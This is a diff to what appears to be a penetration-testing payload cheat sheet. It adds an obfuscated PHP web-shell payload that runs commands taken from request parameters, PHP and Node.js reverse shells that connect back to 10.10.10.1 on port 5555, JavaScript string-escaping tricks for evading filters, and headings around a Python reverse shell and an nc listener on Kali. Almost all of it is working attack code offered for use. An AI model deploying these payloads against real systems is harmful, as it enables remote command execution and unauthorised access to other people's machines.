@@ -1,10 +1,35 @@
-## PHP
+## PHP Command Execution
+
 Payload: echo passthru($_REQUEST["cmd"])
 ```
 <pre><?php eval(base64_decode('ZWNobyBwYXNzdGhydSgkX1JFUVVFU1RbImNtZCJdKTsg'));?></pre>
 ```
+## PHP Reverse Shell
 
-## NC + Python
+```
+$sock=fsockopen("10.10.10.1",5555);
+exec("/bin/sh -i <&3 >&3 2>&3");
+```
+
+## Node.js Reverse Shell
+
+```
+var net = require("net"), sh = require("child_process").exec("/bin/sh");
+var client = new net.Socket();
+client.connect(5555, "10.10.10.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+sh.stderr.pipe(client);});
+```
+
+### Node.js notes
+
+JavaScript strings can be escaped:
+
+- hex encode: "/" -> "\\\\x2f" 
+
+- unicode encode: "/" ->  "\\\\u002f"
+
+
+## Python Reverse Shell
 
 Create Python reverse shell
 
@@ -19,10 +44,12 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
+## Serve Reverse Shell Remotely
+
 Wait for connect back on Kali
 
 ```
-kali@kali:~$ -nlvp 5555
+kali@kali:~$ nc -nlvp 5555
 ```
 
 Serve the shell from Kali
